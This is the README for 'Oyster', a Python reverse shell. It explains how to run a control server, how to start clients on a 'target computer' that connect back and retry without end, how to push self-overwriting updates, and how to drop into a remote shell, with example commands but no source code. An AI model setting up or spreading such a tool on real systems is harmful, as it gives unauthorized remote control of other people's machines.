```python
 .oOOOo.
.O     o.
O       o               O
o       O              oOo
O       o O   o .oOo    o   .oOo. `OoOo.
o       O o   O `Ooo.   O   OooO'  o
`o     O' O   o     O   o   O      O
 `OoooO'  `OoOO `OoO'   `oO `OoO'  o
              o
           OoO'
```

Oyster is a lightweight multi-threaded reverse shell written in python 
3.5.  The server can push updates to the clients, and the clients will
overwrite/restart themselves.

I wrote this after finding an example reverse shell on the thenewboston 
youtube channel.  I saw some things I wanted to improve, so that's what 
I attempted to do.  The clients will continuously try to make a 
connection with the server.

## Control Server

Start `server.py` from the command line.  Here are the keyword arguments 
used for `server.py`:

```
host        - Host IP address.
port        - Host port.
recv_size   - Buffer size for receiving and sending data.
listen      - Maximum number of queued connections.
bind_retry  - How many times to retry binding the socket to the port.
```

Commands for the `Oyster` shell are:

```
list                        -   List the connected clients.
update all                  -   Update all the connected clients using `update.py`.  Clients will overwrite themselves and reboot themselves.
use {client_ip}             -   Use a client connection.  {client_ip} can be found by running the `list` command.
quit                        -   Shut everything down.
```

### `use` Command

The `use` command will set the current connection to the given ip.  Once
this happens, it will drop you into a shell for that connection.  To get
out of the connections shell, run the `quit` command.  This will take 
you back to the `Oyster` shell.

```
Oyster> use 10.0.0.8
/Users/SomeUser/Where/The/Client/Is/Stashed> 
```

### Example

All of the arguments provided below are the defaults except `host`, 
which is a blank string as the default.

```
python3 server.py host=0.0.0.0 port=6667 recv_size=1024 listen=10 bind_retry=5
```

## Client

Start `client.py` on the target computer.  It's up to the user to figure
out how to get this to run on startup or whatever.  Here are startup
arguments.

```
host
port
recv_size
```

### Example

```
python3 client.py host=10.0.0.215 port=6667 recv_size=1024
```
